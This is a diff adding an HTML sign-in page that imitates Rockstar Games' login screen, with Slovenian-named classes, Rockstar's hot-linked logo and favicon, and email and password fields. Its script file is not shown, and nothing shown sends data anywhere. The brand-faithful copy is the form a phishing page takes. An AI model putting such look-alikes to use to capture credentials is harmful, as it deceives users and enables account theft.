@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="sl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Rockstar Games</title>
+
+    <link rel="stylesheet" href="login-styles.css">
+    <script src="login-main.js" defer></script>
+    <link rel="icon" href="https://s.rsg.sc/auth/rockstar.ico">
+</head>
+
+<body>
+
+    <div class="stran-vsebina">
+
+        <!-- LOGO -->
+        <div class="logo-okvir">
+            <img src="https://s.rsg.sc/auth/images/logo_20231030.svg"
+                 alt="Rockstar Games Logotip"
+                 class="logo-slika">
+        </div>
+
+        <!-- BELO OKNO SIGN IN -->
+        <div class="kartica-splosno" id="kartica-login">
+
+            <h2 class="login-naslov">Sign In</h2>
+
+            <!-- INPUT EMAIL -->
+            <div class="floating-group">
+                <input type="email" id="login-email" class="floating-input" placeholder=" ">
+                <label for="login-email" class="floating-label">Email</label>
+            </div>
+
+            <!-- INPUT PASSWORD + SHOW -->
+            <div class="floating-group geslo-skupina">
+                <input type="password" id="login-password" class="floating-input" placeholder=" ">
+                <label for="login-password" class="floating-label">Password</label>
+
+                <button type="button" id="toggle-password" class="show-geslo">Show</button>
+            </div>
+
+            <!-- CHECKBOX KEEP SIGNED -->
+            <label class="checkbox-vrstica">
+                <input type="checkbox" id="keep-signed">
+                <span class="custom-check"></span>
+                Keep me signed in
+            </label>
+
+            <!-- FORGOT PASSWORD -->
+            <a href="#" class="pozabljeno-geslo">Forgot your password?</a>
+
+            <!-- SIGN IN BUTTON -->
+            <button type="button" class="gumb-next login-gumb">Sign in</button>
+
+            <!-- RECAPTCHA -->
+            <p class="recaptcha-login">
+                This site is protected by reCAPTCHA Enterprise and the Google
+                <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
+            </p>
+
+        </div>
+
+        <!-- SIGN UP LINK SPODAJ -->
+        <div class="prijava-tekst-zunaj login-bottom-link">
+            Don't have a Rockstar Games account? 
+            <a href="index.html" class="prijava-link-zunaj">Create a new account</a>
+        </div>
+
+    </div>
+
+    <!-- FOOTER OSTANE ENAK -->
+    <div class="spodnja-noga">
+        <ul>
+            <li><pre>© 2025 ROCKSTAR GAMES  </pre></li> 
+            <li><pre class="ostalo">| PRIVACY POLICY |</pre></li>
+            <li><pre class="ostalo"> TERMS OF SERVICE |</pre></li>
+            <li><pre class="ostalo"> COOKIE SETTINGS</pre></li>
+        </ul>
+    </div>
+
+</body>
+</html>
